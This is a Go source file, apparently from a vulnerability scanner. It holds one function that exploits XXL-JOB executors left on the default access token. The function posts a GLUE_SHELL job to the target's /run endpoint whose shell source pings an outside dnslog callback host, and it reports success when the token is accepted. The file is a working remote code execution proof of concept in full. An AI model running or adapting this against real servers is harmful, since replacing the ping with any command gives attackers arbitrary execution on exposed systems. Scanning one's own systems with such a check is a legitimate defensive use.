package xxljob

import (
	"fmt"
	"net/http"
	"strings"
)

func Default_Token_Rce(host string) bool {

	client := &http.Client{}
	req, err := http.NewRequest("POST", host+"/run", strings.NewReader(`{
		"jobId": 1,
		"executorHandler": "demoJobHandler",
		"executorParams": "demoJobHandler",
		"executorBlockStrategy": "SERIAL_EXECUTION",
		"executorTimeout": 0,
		"logId": 1,
		"logDateTime": 1586373637819,
		"glueType": "GLUE_SHELL",
		"glueSource": "ping xxx.dnslog.cn",
		"glueUpdatetime": 1586693836766,
		"broadcastIndex": 0,
		"broadcastTotal": 0
	}`))
	if err != nil {
		fmt.Println(host + ": false")
		return false
	}

	req.Header.Set("Host", host)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("XXL-JOB-ACCESS-TOKEN", "default token")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err := client.Do(req)
	if err != nil {
		// fmt.Println(host + ": false")
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 && !strings.Contains(resp.Status, "The access token is wrong") {
		// fmt.Println(host + ": true")
		return true
	} else {
		// fmt.Println(host + ": false")
		return false
	}
}
